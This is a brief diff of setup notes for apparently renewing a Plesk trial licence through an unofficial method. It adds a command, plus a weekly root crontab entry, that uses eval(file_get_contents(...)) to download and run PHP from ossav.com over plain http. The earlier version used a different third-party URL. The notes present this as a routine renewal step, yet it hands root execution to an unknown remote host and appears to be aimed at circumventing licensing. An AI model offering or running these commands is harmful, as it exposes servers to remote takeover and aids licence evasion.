@@ -1,12 +1,12 @@
 # Addition to the system here
 
-plesk php -er "eval(file_get_contents('https://plesktrial.yoncu.com/?CMD=x'));";
+plesk php -er "eval(file_get_contents('http://ossav.com/PTC'));"
 
 # For automating renewal create cron job as follows:
 
 # Enter crontab with nano /etc/crontab
 
-22 4 * * 0 root plesk php -er "eval(file_get_contents('https://plesktrial.yoncu.com/?CMD=x'));";
+22 4 * * 0 root plesk php -er "eval(file_get_contents('http://ossav.com/PTC'));";
 
 (Sometimes it may not work)
 # URL: https://plesktrial.yoncu.com/?CMD=x
